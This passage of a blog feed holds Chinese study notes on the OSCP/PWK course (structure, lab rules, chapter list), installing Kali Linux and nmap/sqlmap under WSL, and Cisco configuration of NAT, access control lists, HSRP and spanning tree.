    
    
    
    <entry>
      <title>OSCP-一般课程信息</title>
      <link href="2021/02/16/OSCP-%E4%B8%80%E8%88%AC%E8%AF%BE%E7%A8%8B%E4%BF%A1%E6%81%AF/"/>
      <url>2021/02/16/OSCP-%E4%B8%80%E8%88%AC%E8%AF%BE%E7%A8%8B%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="General-Course-Informations"><a href="#General-Course-Informations" class="headerlink" title="General Course Informations"></a>General Course Informations</h1><blockquote><ul><li><p>Kali Linux Penetration Testing = PWK</p></li><li><p>PWK是为系统和网络管理员与安全专业人员而创建的</p></li></ul></blockquote><h2 id="一：关于PWK课程"><a href="#一：关于PWK课程" class="headerlink" title="一：关于PWK课程"></a>一：关于PWK课程</h2><h4 id="1-应该有的材料"><a href="#1-应该有的材料" class="headerlink" title="1. 应该有的材料"></a>1. 应该有的材料</h4><ul><li>PWK课程材料：实验指南/课程视频</li><li>访问内部网络的VPN：VPN凭据/VPN连接包</li><li>论坛的学生证书：不可以在论坛上发布WP</li><li>现场支持：在线帮助</li><li>OSCP尝试考试：Labs结束后有120天时间来安排和完成考试</li></ul><h4 id="2-官方提供学习策略"><a href="#2-官方提供学习策略" class="headerlink" title="2. 官方提供学习策略"></a>2. 官方提供学习策略</h4><ul><li>查看欢迎邮件和课程信息邮件中包含的所有信息</li><li>复习课程材料</li><li>完成所有课程练习</li><li>攻击实验室机器</li></ul><h4 id="3-课程信息邮件包"><a href="#3-课程信息邮件包" class="headerlink" title="3. 课程信息邮件包"></a>3. 课程信息邮件包</h4><ul><li>VPN包/实验室/论坛凭据/控制面板URL</li></ul><h4 id="4-课程练习"><a href="#4-课程练习" class="headerlink" title="4. 课程练习"></a>4. 课程练习</h4><blockquote><p>Try Header <span class="github-emoji"><span>🍭</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f36d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p></blockquote><h4 id="5-Labs"><a href="#5-Labs" class="headerlink" title="5. Labs"></a>5. Labs</h4><blockquote><p>获取最高权限的交互式shell–&gt;瞄准其他机器            支持：学生论坛/现场帮助</p></blockquote><h2 id="二：渗透测试流程"><a href="#二：渗透测试流程" class="headerlink" title="二：渗透测试流程"></a>二：渗透测试流程</h2><blockquote><p>信息收集–&gt;服务枚举–&gt;渗透–&gt;权限维持–后渗透</p></blockquote><blockquote><p><strong>获取目标主机的Proof.txt文件，表示成功拿下，重点是获取Root/SYSTEM级别的交互式Shell,Network-secret.txt，提交到控制面板中，恢复靶机状态，并解锁其他网络中计算机</strong></p></blockquote><h4 id="1-实验室地址"><a href="#1-实验室地址" class="headerlink" title="1. 实验室地址"></a>1. 实验室地址</h4><table><thead><tr><th>Lab</th><th>Subnet</th><th>Target Start</th><th>Target End</th></tr></thead><tbody><tr><td>PWK</td><td>10.11.1.0/24</td><td>10.11.1.1</td><td>10.11.1.254</td></tr></tbody></table><ul><li>注：<strong>Lab是共享状态，对靶机会限制学生使用数量</strong></li><li>注：<strong>攻击机更改密码或减少服务</strong></li></ul><h4 id="2-Control-Panel"><a href="#2-Control-Panel" class="headerlink" title="2. Control Panel"></a>2. Control Panel</h4><blockquote><p>Reverts 恢复 </p><p>Client Machines /客户端机器</p><p><strong>不要再客户机上存储任何需要保留的信息</strong></p></blockquote><ul><li><strong>我们会获取到的三台客户机：Windows10/Debian/Windows server 2016</strong></li></ul><h4 id="3-行为限制"><a href="#3-行为限制" class="headerlink" title="3. 行为限制"></a>3. 行为限制</h4><ol><li>不要对网路发起ARP欺骗/中间人攻击</li><li>不要删除关键系统文件或提示</li><li>不要更改Network-secret.txt/proof.txt</li><li>不要故意干扰其他机器：关闭机器/把用户踢出机器/阻止特定IP或范围/入侵他人客户机</li></ol><h4 id="4-Reporting"><a href="#4-Reporting" class="headerlink" title="4. Reporting"></a>4. Reporting</h4><ul><li>考虑评估目标：<strong>大纲，阻止内容</strong></li><li>考虑阅读对象：<strong>摘要，面向管理层；详细面向技术人员</strong></li><li>考虑包括内容：<strong>关键截图/额外材料-&gt;附加证明文件/回顾观点</strong></li><li>考虑演示文稿：<strong>简单易懂的观点/字体样式，间距段落，标题；保持一致/拼写检查</strong></li></ul><h4 id="5-CPE学分"><a href="#5-CPE学分" class="headerlink" title="5. CPE学分"></a>5. CPE学分</h4><blockquote><p>提交Lab报告，并将课程练习作为附录</p></blockquote><h4 id="6-Not-taking-Tools"><a href="#6-Not-taking-Tools" class="headerlink" title="6. Not taking Tools"></a>6. Not taking Tools</h4><blockquote><p>记录笔记的工具:OneNote /DayOne /Joplin /MDwiki</p></blockquote><h4 id="7-Backups"><a href="#7-Backups" class="headerlink" title="7. Backups"></a>7. Backups</h4><blockquote><p>备份：文件/快照</p></blockquote><h4 id="8-About-The-OSCP-Exam"><a href="#8-About-The-OSCP-Exam" class="headerlink" title="8. About The OSCP Exam"></a>8. About The OSCP Exam</h4><ul><li><p><strong>70分及格</strong>–&gt;</p></li><li><p><strong>23小时45分钟考试时间</strong>–&gt;</p></li><li><p><strong>远程监控考试</strong>–&gt;</p></li><li><p><strong>提前15分钟到场</strong>–&gt;</p></li><li><p><strong>身份验证/考前任务</strong>–&gt;</p></li><li><p><strong>检查包：VPN连接包/考试控制面板URL</strong></p></li></ul><blockquote><p>考试申请需要时间：可提前申请</p><p><strong>MSF可在实验中使用/考试中受到限制</strong></p></blockquote><h4 id="9-Wrapping-Up"><a href="#9-Wrapping-Up" class="headerlink" title="9. Wrapping Up"></a>9. Wrapping Up</h4><ul><li>参考网络资源…</li><li>如有错误之处请联系作者更新…</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机认证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-目录</title>
      <link href="2021/02/16/OSCP-%E7%9B%AE%E5%BD%95/"/>
      <url>2021/02/16/OSCP-%E7%9B%AE%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Offensive-Security-进攻性安全"><a href="#Offensive-Security-进攻性安全" class="headerlink" title="Offensive Security 进攻性安全"></a>Offensive Security 进攻性安全</h1><blockquote><p>Penetration Testing With Kali linux</p></blockquote><p><img src="https://www.offensive-security.com/wp-content/uploads/2020/09/PWK-OSCP-PEN-200-box-label.png"></p><table><thead><tr><th align="center">目录数</th><th align="left">章节标题</th><th align="left">翻译</th></tr></thead><tbody><tr><td align="center">第一章</td><td align="left">General Course Informations</td><td align="left">一般课程信息</td></tr><tr><td align="center">第二章</td><td align="left">Getting Comfortable With Kali</td><td align="left">适应Kali</td></tr><tr><td align="center">第三章</td><td align="left">Command Line Fun</td><td align="left">命令行乐趣</td></tr><tr><td align="center">第四章</td><td align="left">Practical Tools</td><td align="left">实用工具</td></tr><tr><td align="center">第五章</td><td align="left">Bash Scripting</td><td align="left">Bash脚本</td></tr><tr><td align="center">第六章</td><td align="left">Passive information Gathering</td><td align="left">被动式信息收集</td></tr><tr><td align="center">第七章</td><td align="left">Active information Gathering</td><td align="left">主动式信息收集</td></tr><tr><td align="center">第八章</td><td align="left">Vulnerability Scanning</td><td align="left">漏洞扫描</td></tr><tr><td align="center">第九章</td><td align="left">Web Application Attacks</td><td align="left">Web应用程序攻击</td></tr><tr><td align="center">第十章</td><td align="left">Introduction To Buffer Overflows</td><td align="left">缓冲区溢出简介</td></tr><tr><td align="center">第十一章</td><td align="left">Windows Buffer Overflows</td><td align="left">Windows缓冲区溢出</td></tr><tr><td align="center">第十二章</td><td align="left">Linux Buffer Overflows</td><td align="left">Linux缓冲区溢出</td></tr><tr><td align="center">第十三章</td><td align="left">Client-side Attacks</td><td align="left">客户端攻击</td></tr><tr><td align="center">第十四章</td><td align="left">Locating Public Exploits</td><td align="left">定位公共漏洞</td></tr><tr><td align="center">第十五章</td><td align="left">Fixing Exploits</td><td align="left">修复漏洞</td></tr><tr><td align="center">第十六章</td><td align="left">File Transfer</td><td align="left">文件传输</td></tr><tr><td align="center">第十七章</td><td align="left">Antivirus Evasion</td><td align="left">防病毒规避</td></tr><tr><td align="center">第十八章</td><td align="left">Privilege Escalation</td><td align="left">权限提升</td></tr><tr><td align="center">第十九章</td><td align="left">Password Attacks</td><td align="left">密码攻击</td></tr><tr><td align="center">第二十章</td><td align="left">Port Redirection and Tunneling</td><td align="left">端口重定向和隧道</td></tr><tr><td align="center">第二十一章</td><td align="left">Active Directory Attacks</td><td align="left">AD域攻击</td></tr><tr><td align="center">第二十二章</td><td align="left">The Metasploit Framework</td><td align="left">Metasploit框架</td></tr><tr><td align="center">第二十三章</td><td align="left">Powershell Empire</td><td align="left">Powershell帝国</td></tr><tr><td align="center">第二十四章</td><td align="left">Penetration Test Breakdown</td><td align="left">渗透测试故障</td></tr><tr><td align="center">第二十五章</td><td align="left">Try Header:The Labs</td><td align="left">更努力：实验室</td></tr></tbody></table><ul><li>内容参照于<a href="https://www.offensive-security.com/pwk-oscp/">官方连接</a></li><li>如有错误之处请联系作者更新…</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机认证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WIN10-安装Kali</title>
      <link href="2021/02/12/WIN10-%E5%AE%89%E8%A3%85Kali/"/>
      <url>2021/02/12/WIN10-%E5%AE%89%E8%A3%85Kali/</url>
      
        <content type="html"><![CDATA[<h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><blockquote><p>起因：win10 的应用商店有了ump版本的Kali Linux</p></blockquote><h4 id="步骤一：配置系统"><a href="#步骤一：配置系统" class="headerlink" title="步骤一：配置系统"></a>步骤一：配置系统</h4><ul><li>以管理员身份打开Powershell,然后执行</li></ul><pre><code class="powershell">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</code></pre><h4 id="步骤二：配置浏览器"><a href="#步骤二：配置浏览器" class="headerlink" title="步骤二：配置浏览器"></a>步骤二：配置浏览器</h4><ul><li>打开IE浏览器–&gt;Internet选项–&gt;高级标签页–&gt;设置框–&gt;安全选项下勾选（TLS1.0 TLS1.1 TLS1.2 ）</li></ul><h4 id="步骤三：安装Kali-Linux"><a href="#步骤三：安装Kali-Linux" class="headerlink" title="步骤三：安装Kali Linux"></a>步骤三：安装Kali Linux</h4><ul><li><p>打开Microsoft Store–&gt;搜索Kali–安装</p></li><li><p>安装完后启动kali linux</p></li><li><p>第一次启动Kali Linux,会要求创建新的用户其对应密码</p></li><li><p>进入用户终端，开搞</p></li></ul><h4 id="步骤四：安装工具"><a href="#步骤四：安装工具" class="headerlink" title="步骤四：安装工具"></a>步骤四：安装工具</h4><ul><li><p>切换root用户</p><pre><code class="shell">sudo -i </code></pre></li><li><p>安装nmap与sqlmap</p><pre><code class="shell">┌──(root💀FaLao)-[~]└─# apt-get install nmap sqlmap</code></pre></li><li><p>查看Nmap与sqlmap帮助信息</p><pre><code class="shell">┌──(root💀FaLao)-[~]└─# nmap -hWarning: Nmap may not work correctly on Windows Subsystem for Linux.For best performance and accuracy, use the native Windows build from https://nmap.org/download.html#windows.Nmap 7.91 ( https://nmap.org )Usage: nmap [Scan Type(s)] [Options] {target specification}....┌──(root💀FaLao)-[~]└─# sqlmap        ___       __H__ ___ ___[)]_____ ___ ___  {1.5.2#stable}|_ -| . [.]     | .'| . ||___|_  [']_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.orgUsage: python3 sqlmap [options]sqlmap: error: missing a mandatory option (-d, -u, -l, -m, -r, -g, -c, --list-tampers, --wizard, --update, --purge or --dependencies). Use -h for basic and -hh for advanced help....</code></pre></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>主系统为kali换windows推荐使用，有Windows工具包不推荐使用</li><li>未完待续…</li></ul>]]></content>
      
      
      <categories>
          
          <category> 服务器运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cisco-网络地址转换</title>
      <link href="2021/02/12/Cisco-%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2/"/>
      <url>2021/02/12/Cisco-%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="网络地址转换"><a href="#网络地址转换" class="headerlink" title="网络地址转换"></a>网络地址转换</h1><blockquote><p>通过将内部网络地址的私有IP地址翻译成全球唯一的公网IP地址，是内部网络可以连接到互联网等外部网络上</p></blockquote><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul><li>节省公有合法IP地址</li><li>处理地址重叠</li><li>增强灵活性</li><li>安全性</li></ul><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul><li>延迟增大</li><li>配置和维护的复杂性</li><li>不支持某些应用，可以通过静态NAT映射来避免</li></ul><h4 id="NAT实现方式"><a href="#NAT实现方式" class="headerlink" title="NAT实现方式"></a>NAT实现方式</h4><ol><li><p>静态转换：IP地址的对应关系是一对一，而且是不变的，借助静态的转换，能实现网络对内部网络中某些特设定服务器的访问</p><p>静态NAT配置：配置接口以及路由</p><pre><code class="shell">ip nat inside source static 192.168.100.1 202.102.152.3</code></pre><blockquote><p>进入出口配置：ip nat outdside </p><p>进入入口配置：ip nat inside </p></blockquote></li><li><p>动态转换：IP地址的对应关系是不确定的，而是随机的，所有被授权访问互联网的私有地址可以随机转换位任何指定的合法的外部IP地址。内部网络同时访问Internet的主机数少于配置的合法地址中的IP个数时适用</p><p>动态NAT配置：</p><pre><code class="shell">access-list 1 permit 192.168.100.0 0.0.0.255   //全局配置模式ip nat pool nsd 1.1.1.1 1.1.1.2 netmast 255.255.255.248  //定义地址池名为nsd，地址池IP范围1.1.1.1到1.1.1.2   全局配置模式ip nat inside source list 1 pool nsd</code></pre></li><li><p>端口多路复用（PAT）</p><blockquote><p>通过改变外出数据包的源IP地址和源端口并进行端口转换，内部网络的所有主机均可共享一个合法的IP地址实现互联网的访问，节约IP </p></blockquote><p>PAT的配置：</p><pre><code class="shell">ip nat inside source list 1 interface f0/1 overload</code></pre></li></ol><h4 id="NAT转换条目"><a href="#NAT转换条目" class="headerlink" title="NAT转换条目"></a>NAT转换条目</h4><ul><li><p>查看NAT转换条目</p><pre><code class="shell">show ip nat translations //显示当前存在的转换 特权模式</code></pre></li><li><p>清除NAT转换条目</p><pre><code class="shell">clear ip nat translation * //清除NAT转换条目中的所有条目注意：静态NAT条目不会被清除</code></pre></li></ul><h4 id="NAT三种实现方式的区别"><a href="#NAT三种实现方式的区别" class="headerlink" title="NAT三种实现方式的区别"></a>NAT三种实现方式的区别</h4><ul><li>静态转换的对应关系一对一且不变，并没有节约共用IP地址，只隐藏了主机的真实地址</li><li>动态转换虽然在一定情况下节约了公有IP，但当内部网络访问的Internet的主机数大于合法的地址池中的IP数量时就不适用了</li><li>端口多路复用可以所有内部网络共享一个合法的外部IP地址，从而最大限度节约IP地址资源</li></ul><h4 id="NAT常见问题"><a href="#NAT常见问题" class="headerlink" title="NAT常见问题"></a>NAT常见问题</h4><ul><li>ACL阻止转换后的流量</li><li>进行地址转换的ACL不全</li><li>overload参数漏配</li><li>不对称路由问题</li><li>动态地址池IP地址范围配置错误</li><li>inside和outside接口配置错误</li></ul><h4 id="显示每个转化的数据包"><a href="#显示每个转化的数据包" class="headerlink" title="显示每个转化的数据包"></a>显示每个转化的数据包</h4><pre><code class="shell">debug ip nat  //特权模式</code></pre><blockquote><p>S表示源地址  D表示目的地址</p><p>192.168.1.2-&gt;4.4.4.4 表示将192.168.1.2转换为4.4.4.4</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程师 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cisco-访问控制列表</title>
      <link href="2021/02/12/Cisco-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8/"/>
      <url>2021/02/12/Cisco-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="一：ACL概述"><a href="#一：ACL概述" class="headerlink" title="一：ACL概述"></a>一：ACL概述</h1><h4 id="访问控制列表（ACL）"><a href="#访问控制列表（ACL）" class="headerlink" title="访问控制列表（ACL）"></a>访问控制列表（ACL）</h4><ul><li>读取第三层，第四层包头信息</li><li>根据预定好的规则对包进行过滤</li></ul><h4 id="访问空控制列表的处理过程"><a href="#访问空控制列表的处理过程" class="headerlink" title="访问空控制列表的处理过程"></a>访问空控制列表的处理过程</h4><ul><li>如果匹配第一条规则，则不再往下检查，路由器将决定该数据包允许通过或拒绝通过</li><li>如果不匹配第一条规则，则依次往下检查，知道有有任何一条规则匹配</li><li>如果最后没有任何一条规则匹配，则路由器根据默认的规则将丢弃该数据包</li></ul><h4 id="访问控制列表的类型"><a href="#访问控制列表的类型" class="headerlink" title="访问控制列表的类型"></a>访问控制列表的类型</h4><ul><li>标准访问控制列表基于源IP地址的过滤数据包</li><li>扩展访问控制列表基于源IP地址，目的IP地址，指定协议，端口等来过滤数据包列表号是100~199</li><li>命名访问控制列表命名访问控制列表在标准和扩展访问控制列表中使用名称代替表号</li></ul><h1 id="二：标准访问控制列表"><a href="#二：标准访问控制列表" class="headerlink" title="二：标准访问控制列表"></a>二：标准访问控制列表</h1><h4 id="步骤一：标准访问控制列表的创建"><a href="#步骤一：标准访问控制列表的创建" class="headerlink" title="步骤一：标准访问控制列表的创建"></a>步骤一：标准访问控制列表的创建</h4><pre><code class="shell">access-list 1 deny 192.168.1.1 0.0.0.0access-list 1 permit 192.168.1.0 0.0.0.255</code></pre><blockquote><p>通配符掩码：也叫做反掩码。用二进制数0和1表示，如果某位为1，表明这意味不需要进行匹配操作，如果0表明需要严格匹配。例如：192.168.1.0/24 子网掩码是255.255.255.0，其反码表示可以通过255.255.255.255减去255.255.255.0得到0.0.0.255</p></blockquote><ul><li><p>隐含的拒绝语句</p><pre><code class="shell">access-list 1 deny 0.0.0.0 255.255.255.255</code></pre></li></ul><h4 id="步骤二：将ACL应用于接口"><a href="#步骤二：将ACL应用于接口" class="headerlink" title="步骤二：将ACL应用于接口"></a>步骤二：将ACL应用于接口</h4><blockquote><p>接口模式:ip access-group 列表号 in或out</p></blockquote><pre><code class="shell">access-list 1 deny 192.168.1.1 0.0.0.0 或者写为access-list 1 deny host 192.1681.1  </code></pre><pre><code class="shell">access-list deny 0.0.0.0 255.255.255.255或者写为access-list deny any </code></pre><h4 id="步骤三：删除已建立的访问控制列表"><a href="#步骤三：删除已建立的访问控制列表" class="headerlink" title="步骤三：删除已建立的访问控制列表"></a>步骤三：删除已建立的访问控制列表</h4><pre><code class="shell">no access-list 列表号   //全局配置模式</code></pre><h4 id="步骤四：接口上取消ACL"><a href="#步骤四：接口上取消ACL" class="headerlink" title="步骤四：接口上取消ACL"></a>步骤四：接口上取消ACL</h4><pre><code class="shell">no ip access-group 列表号 in或out</code></pre><h4 id="步骤五：查看访问控制列表"><a href="#步骤五：查看访问控制列表" class="headerlink" title="步骤五：查看访问控制列表"></a>步骤五：查看访问控制列表</h4><pre><code class="shell">show access-lists //特权模式</code></pre><h1 id="三：扩展访问控制列表"><a href="#三：扩展访问控制列表" class="headerlink" title="三：扩展访问控制列表"></a>三：扩展访问控制列表</h1><blockquote><p>可以根据源IP地址，目的IP地址，指定协议，端口等过滤数据包</p></blockquote><ul><li>扩展访问控制列表号:100-199</li><li>eq等于，lt小于，gt大于，neq不等于</li><li>扩展ACL应该应用在离源地址最近的路由器上</li></ul><h4 id="扩展访问控制列表案例"><a href="#扩展访问控制列表案例" class="headerlink" title="扩展访问控制列表案例"></a>扩展访问控制列表案例</h4><ul><li>例子1</li></ul><pre><code class="shell">access-list 101 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0255(允许192.168.1.0网络访问192.168.2.0网络的所有的服务）   //全局模式access-list 101 deny ip any any //拒绝所有的服务  //全局模式</code></pre><ul><li>例子2</li></ul><pre><code class="shell">access 101 deny tcp 192.168.1.0 0.0.0.255 host 192.168.2.2 eq 21(拒绝192.168.1.0网段访问192.168.2.2的TCP的21端口   //全局配置模式access-list 101 permit ip any any (允许访问所有）</code></pre><ul><li>例子3</li></ul><pre><code class="shell">access-list 101 deny icmp 192.168.1.0 0.0.0.255 host 192.168.2.2 echo 拒绝192.168.1.0 ping 192.168.2.2</code></pre><ul><li><p>删除扩展ACL</p><pre><code class="shell">no access-list 列表号</code></pre><p>注意：扩展与标准ACL不能删除单条ACL语句，只能删除整个ACL</p></li></ul><h1 id="四：命名访问控制类表"><a href="#四：命名访问控制类表" class="headerlink" title="四：命名访问控制类表"></a>四：命名访问控制类表</h1><ul><li><p>命名访问控制类表可以配置标准命名可以配置扩展命名</p></li><li><p>命名访问控制列表的ACL语句默认第一条为10，第二条为20，以此类推</p></li><li><p>命名ACL可以删除单条ACL语句，而不必删除整个ACL。并且命名ACL语句可以有选择的插入到列表中的某个位置，使得ACL配置更加方便灵活</p></li><li><p>标准命名ACL的配置</p><pre><code class="shell">全局：ip access-list standard 名字permit hsot 192.168.1.1deny deny</code></pre><pre><code class="shell">ip access-group 名字 in或者out  //命名ACL应用于接口</code></pre></li><li><p>扩展命名ACL的配置</p><pre><code class="shell">全局：ip access-list extended 名字deny tcp 192.168.1.0 0.0.0.255 host 192.168.2.2 eq 80 //拒绝1.0网段访问2.2的WEB服务permit ip any any </code></pre></li><li><p>未完待续…</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程师 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cisco-HSRP与STP</title>
      <link href="2021/02/12/Cisco-HSRP%E4%B8%8ESTP/"/>
      <url>2021/02/12/Cisco-HSRP%E4%B8%8ESTP/</url>
      
        <content type="html"><![CDATA[<h1 id="一：HSRP介绍"><a href="#一：HSRP介绍" class="headerlink" title="一：HSRP介绍"></a>一：HSRP介绍</h1><blockquote><p>热备份路由协议(HSRP)公有协议(VRRP)</p></blockquote><h4 id="HSRP作用"><a href="#HSRP作用" class="headerlink" title="HSRP作用"></a>HSRP作用</h4><p>思科的私有协议，确保当网络边缘设备或接入链路出现故障时，用户通信能迅速并透明的恢复，依次为IP网络冗余，通过使用同一个虚拟IP地址和虚拟MAC地址，LAN网段上的两天或者多台路由器可以作为一台虚拟路由器对外提供服务，HSRP使组内的思科路由能相互监视对方的运行状态；</p><h4 id="HSRP组成员"><a href="#HSRP组成员" class="headerlink" title="HSRP组成员:"></a>HSRP组成员:</h4><blockquote><ul><li><p>活跃路由器</p></li><li><p>备份路由器</p></li><li><p>虚拟路由器 （该lan上的网关）</p></li><li><p>其他路由器</p></li></ul></blockquote><blockquote><p>HSRP虚拟MAC地址格式：0000.0c07.ac2f厂商编码</p><p>HSRP 虚拟MAC地址，HSRP编码总是07.acHSRP组号</p></blockquote><h4 id="HSRP消息"><a href="#HSRP消息" class="headerlink" title="HSRP消息"></a>HSRP消息</h4><blockquote><p>HSRP中的所有路由器都发送或接受HSRP消息</p><p>使用用户数据报协议（udp）端口号1985</p><p>使用组播发送HSRP消息，组播地址224.0.0.2生存时间TTL=1</p></blockquote><h4 id="HSRP状态"><a href="#HSRP状态" class="headerlink" title="HSRP状态"></a>HSRP状态</h4><blockquote><p>1:)初始状态</p><p>2:)学习状态:等待来自活跃路由器的消息，此时还没有看到hello消息，也没有学习到虚拟路由器的IP地址</p><p>3:)监听状态：此时知道了虚拟IP地址，监听来自活跃路由器和备份路由器</p><p>4:)发言状态：周期性的发送hello消息，并参与活跃与备份路由的竞选，在获得虚拟路由器的IP地址之前，不能进入发言状态</p><p>5:)备份状态:成为下一个活跃路由器的候选设备，并周期性的发送hello消息，在一组内只有一台备份路由器</p><p>6:)活跃状态：在此状态下路由器负责转发发送到备份组的虚拟MAC地址的数据包并周期性发送hello消息，在一组中只有一台活跃路由器</p></blockquote><h4 id="HSRP计时器"><a href="#HSRP计时器" class="headerlink" title="HSRP计时器"></a>HSRP计时器</h4><blockquote><p>hello间隔（默认3S）</p><p>保持时间 （默认10S）</p></blockquote><h1 id="二：HSRP配置"><a href="#二：HSRP配置" class="headerlink" title="二：HSRP配置"></a>二：HSRP配置</h1><h4 id="步骤一：配置HSRP的成员"><a href="#步骤一：配置HSRP的成员" class="headerlink" title="步骤一：配置HSRP的成员"></a>步骤一：配置HSRP的成员</h4><pre><code class="shell">standby 2 ip 虚拟网关IP    //进入路由器的网关接口</code></pre><h4 id="步骤二：配置HSRP的优先级"><a href="#步骤二：配置HSRP的优先级" class="headerlink" title="步骤二：配置HSRP的优先级"></a>步骤二：配置HSRP的优先级</h4><pre><code class="shell">standby 2 priority 优先级  //优先级范围0-255，默认为100</code></pre><h4 id="步骤三：查看HSRP摘要信息"><a href="#步骤三：查看HSRP摘要信息" class="headerlink" title="步骤三：查看HSRP摘要信息"></a>步骤三：查看HSRP摘要信息</h4><pre><code class="shell">show standby brief   //在特权模式下查看</code></pre><h4 id="步骤四：HSRP端口跟踪"><a href="#步骤四：HSRP端口跟踪" class="headerlink" title="步骤四：HSRP端口跟踪"></a>步骤四：HSRP端口跟踪</h4><pre><code class="shell">standby 2 track f0/1</code></pre><h4 id="步骤五：HSRP占先权"><a href="#步骤五：HSRP占先权" class="headerlink" title="步骤五：HSRP占先权"></a>步骤五：HSRP占先权</h4><pre><code class="shell">standby 2 preempt</code></pre><h4 id="步骤六：查看HSRP的详细信息"><a href="#步骤六：查看HSRP的详细信息" class="headerlink" title="步骤六：查看HSRP的详细信息"></a>步骤六：查看HSRP的详细信息</h4><pre><code class="shell">show  standby   //特权模式</code></pre><h1 id="三：STP生成树"><a href="#三：STP生成树" class="headerlink" title="三：STP生成树"></a>三：STP生成树</h1><h4 id="STP-spanning-tree-protocol作用："><a href="#STP-spanning-tree-protocol作用：" class="headerlink" title="STP-spanning tree protocol作用："></a>STP-spanning tree protocol作用：</h4><ul><li>逻辑上断开环路，防止广播风暴的产生</li><li>当线路故障，阻塞接口被激活，恢复通信，其备份线路的作用</li></ul><h4 id="生成树算法"><a href="#生成树算法" class="headerlink" title="生成树算法"></a>生成树算法</h4><blockquote><p>每个广播域或一个网桥（root bridge）</p><p>每个非根网桥一个根端口（root ports）</p><p>每个网段上一个指定端口（designated ports）</p><p>非指定端口，非根端口被堵塞</p></blockquote><h4 id="生成树算法的分为三个步骤"><a href="#生成树算法的分为三个步骤" class="headerlink" title="生成树算法的分为三个步骤"></a>生成树算法的分为三个步骤</h4><ol><li><p>选择根网桥<br>选择交换网络中的网桥ID最小的交换机称为根网桥，网桥ID是一个8字的字段，前两个字节十进制数为网桥的优先级，后六个字是网桥的MSC地址，优先级小的被选择为根网桥，如优先级相同则MAC地址小的为根网桥；<br>网桥的优先级的取值范围0-65535默认值为32768</p></li><li><p>选择根端口（root ports）<br>在分根网桥上选择端口，每个非根网桥值能选择一个根端口<br>依据：</p><ul><li><p>到根网桥的成本最低的根路径成本宽带越大，传输数据的成本也就越低带宽与路径成本的之间的关系：</p><table><thead><tr><th align="center">链路带宽 Mbps</th><th align="center">路径成本</th></tr></thead><tbody><tr><td align="center">10</td><td align="center">100</td></tr><tr><td align="center">16</td><td align="center">62</td></tr><tr><td align="center">45</td><td align="center">39</td></tr><tr><td align="center">100</td><td align="center">19</td></tr><tr><td align="center">155</td><td align="center">14</td></tr><tr><td align="center">622</td><td align="center">6</td></tr><tr><td align="center">1000</td><td align="center">4</td></tr><tr><td align="center">10000</td><td align="center">2</td></tr></tbody></table></li><li><p>直连的网桥ID最小<br>当路径成本相同的时候，比较连接的交换机的网桥ID值，选网桥的ID值小的作为根端口</p></li><li><p>端口ID最小<br>当网桥ID相同的时候，比较端口ID值，（比较的是对端的端口ID）选择较小的作为根端口</p></li></ul></li><li><p>选择指定端口（designated ports）根桥上的端口全是指定端口在每个网桥上，选择一个指定端口非根桥上的指定端口，选择顺序：</p><ul><li>根路径成本较低</li><li>所在的交换机的网桥ID的值较小</li><li>端口ID的值较小（与选择根端口不同的是在比较端口ID值时，比较的是自身的端口ID值）</li></ul></li><li><p>BPDU(桥协议数据单元）</p><ul><li><p>使用组播协议发送BPDU</p></li><li><p>两种类型：配置BPDU /拓扑变更通告BPDU </p></li><li><p>BPDU报文字段，主要关键字：</p><blockquote><p>根网桥ID </p><p>根路径成本</p><p>发送网桥ID</p><p>端口ID</p></blockquote></li></ul></li><li><p>STP的收敛：</p><blockquote><p>交换机端口的5中STP状态：</p></blockquote><table><thead><tr><th align="center">状态</th><th align="center">用途</th></tr></thead><tbody><tr><td align="center">转发</td><td align="center">发送/接受用户数据</td></tr><tr><td align="center">学习</td><td align="center">构建网桥表</td></tr><tr><td align="center">侦听</td><td align="center">构建“活动”拓扑</td></tr><tr><td align="center">阻塞</td><td align="center">只接受BPDU</td></tr><tr><td align="center">禁用</td><td align="center">强制关闭</td></tr></tbody></table></li><li><p>STP的计时器</p><ul><li><p>Hello时间：网桥发送BPDU报文之间的时间间隔，默认2秒</p></li><li><p>转发延迟：一个端口在侦听到学习状态所花费的时间间隔，默认15秒*</p></li><li><p>最大老化时间：交换机在丢弃BPDU报文之前存储他最的时间，默认20秒每一个交换端口都保存一份她所侦听到最好的BPDU备份，如果源BPDU失去了与交换机端口的联系，交换机则在最大老化事假之后通知网络已经发生了拓扑结构方面的变化</p><blockquote><p>vlan与STP生成树之间的关系：</p></blockquote><p><img src="https://s3.ax1x.com/2021/02/12/yD2yQS.png"></p><blockquote><p>PVST+（增强的每vlan生成树）</p><p>PVST的配置的意义</p><p>配置网络中比较稳定的交换机为网桥利用PVST实现网络的负载分担</p></blockquote><h1 